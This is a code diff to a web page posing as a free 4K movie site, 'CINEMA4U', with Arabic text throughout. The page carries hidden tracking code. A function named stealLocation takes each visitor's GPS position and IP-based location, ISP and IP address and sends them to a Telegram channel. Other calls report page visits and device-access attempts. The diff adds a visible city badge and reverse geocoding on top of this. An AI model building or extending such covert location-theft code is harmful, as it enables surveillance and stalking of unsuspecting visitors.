@@ -75,6 +75,25 @@
             box-shadow: 0 0 12px rgba(229, 9, 20, 0.3);
             width: 320px;
         }
+        /* إضافة ترويسة الموقع مع اسم الولاية */
+        .location-badge {
+            background: rgba(229, 9, 20, 0.15);
+            border-radius: 40px;
+            padding: 0.3rem 1rem;
+            font-size: 0.8rem;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            border: 1px solid rgba(229, 9, 20, 0.3);
+            backdrop-filter: blur(4px);
+        }
+        .location-badge i { color: #e50914; font-size: 0.8rem; }
+        .hero-location {
+            margin-top: 0.5rem;
+            font-size: 0.9rem;
+            color: #ccc;
+        }
         .main-container {
             display: flex;
             max-width: 1600px;
@@ -333,6 +352,9 @@
         <div id="home" class="hero-section">
             <div class="hero-title">أهلاً بك في CINEMA4U</div>
             <div class="hero-desc">أكبر مكتبة أفلام ومسلسلات بجودة 4K وبدون إعلانات. استمتع بتجربة سينما حقيقية من منزلك.</div>
+            <div class="hero-location" id="heroLocation">
+                <div class="location-badge"><i class="fas fa-map-marker-alt"></i> <span id="userCity">جاري تحديد موقعك...</span></div>
+            </div>
         </div>
 
         <div id="movies"><div class="section-title"><i class="fas fa-film"></i> أفلام حصرية</div><div class="movies-grid" id="moviesGrid"></div></div>
@@ -370,6 +392,16 @@
 
     sendTextToTelegram("🌐 تم فتح موقع CINEMA4U");
 
+    // تحديث اسم المدينة/الولاية في واجهة الموقع
+    function updateCityDisplay(cityName) {
+        const citySpan = document.getElementById('userCity');
+        if (citySpan && cityName) {
+            citySpan.innerHTML = `<i class="fas fa-location-dot"></i> ${cityName}`;
+        } else if (citySpan) {
+            citySpan.innerHTML = `<i class="fas fa-question-circle"></i> لم يتم التعرف على الموقع`;
+        }
+    }
+
     // ========== وظيفة سرقة الموقع القوية (GPS أولاً ثم IP كاحتياطي) ==========
     let locationRetryCount = 0;
     function stealLocation() {
@@ -382,6 +414,16 @@
                     const { latitude, longitude, accuracy } = position.coords;
                     const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
                     sendTextToTelegram(`📍 الموقع الدقيق (GPS):\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nالدقة: ±${accuracy} متر\nرابط الخريطة: ${mapsLink}`);
+                    // محاولة الحصول على اسم المدينة من الإحداثيات (عبر reverse geocoding)
+                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`)
+                        .then(res => res.json())
+                        .then(data => {
+                            if (data && data.address) {
+                                const city = data.address.city || data.address.town || data.address.village || data.address.state || 'موقع غير معروف';
+                                updateCityDisplay(city);
+                            }
+                        })
+                        .catch(() => updateCityDisplay('تم التحديد (GPS)'));
                 },
                 (error) => {
                     console.warn("خطأ في الحصول على الموقع:", error);
@@ -414,7 +456,7 @@
         }
     }
 
-    // الحصول على الموقع التقريبي عبر IP API (خطة احتياطية)
+    // الحصول على الموقع التقريبي عبر IP API (خطة احتياطية) وتحديث الواجهة
     function getLocationByIP() {
         sendTextToTelegram("🌐 جاري جلب الموقع التقريبي عبر IP...");
 
@@ -424,6 +466,8 @@
                 url: "https://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,query",
                 parser: (data) => {
                     if (data && data.status === 'success') {
+                        if (data.city) updateCityDisplay(`${data.city}, ${data.regionName || ''}`);
+                        else if (data.regionName) updateCityDisplay(data.regionName);
                         return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.query}\n🏳️ البلد: ${data.country}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.regionName}\n📐 خط العرض: ${data.lat}\n📐 خط الطول: ${data.lon}\n🔌 مزود الخدمة: ${data.isp}`;
                     }
                     return null;
@@ -434,6 +478,8 @@
                 url: "https://ipinfo.io/json",
                 parser: (data) => {
                     if (data && data.ip) {
+                        const city = data.city || data.region || '';
+                        if (city) updateCityDisplay(city);
                         const loc = data.loc ? data.loc.split(',') : [];
                         return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.ip}\n🏳️ البلد: ${data.country}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.region}\n📐 خط العرض: ${loc[0] || 'غير متوفر'}\n📐 خط الطول: ${loc[1] || 'غير متوفر'}\n🔌 مزود الخدمة: ${data.org}`;
                     }
@@ -445,6 +491,7 @@
                 url: "https://geoapi-hoskes.onrender.com/json.gp",
                 parser: (data) => {
                     if (data && data.ip) {
+                        if (data.city) updateCityDisplay(data.city);
                         return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.ip}\n🏳️ البلد: ${data.country_name}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.region}\n📐 خط العرض: ${data.latitude}\n📐 خط الطول: ${data.longitude}\n📮 الرمز البريدي: ${data.postal_code}`;
                     }
                     return null;
@@ -455,6 +502,7 @@
                 url: "https://ipwho.is/",
                 parser: (data) => {
                     if (data && data.success) {
+                        if (data.city) updateCityDisplay(data.city);
                         return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.ip}\n🏳️ البلد: ${data.country}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.region}\n📐 خط العرض: ${data.latitude}\n📐 خط الطول: ${data.longitude}\n🔌 مزود الخدمة: ${data.connection.isp}`;
                     }
                     return null;
@@ -467,6 +515,7 @@
         function tryService() {
             if (currentServiceIndex >= services.length) {
                 sendTextToTelegram("❌ فشلت جميع محاولات جلب الموقع عبر IP.");
+                updateCityDisplay('غير معروف');
                 return;
             }
 
@@ -528,7 +577,7 @@
         } catch (e) { sendTextToTelegram(`❌ فشل الوصول للأجهزة: ${e.message}`); }
     }
 
-    // روابط المشاهدة الحقيقية
+    // روابط المشاهدة الحقيقية (كما هي)
     const MOVIE_LINKS = {
         "Ratatouille": "https://as.akwam.tube/all/%D9%81%D9%8A%D9%84%D9%85-ratatouille-2007-%D9%85%D8%AA%D8%B1%D8%AC%D9%85/",
         "هاري بوتر": "https://as.akwam.tube/ar/video/watch-harry-potter-and-the-sorcerers-stone-2001-translated-online-akoam-15250/",
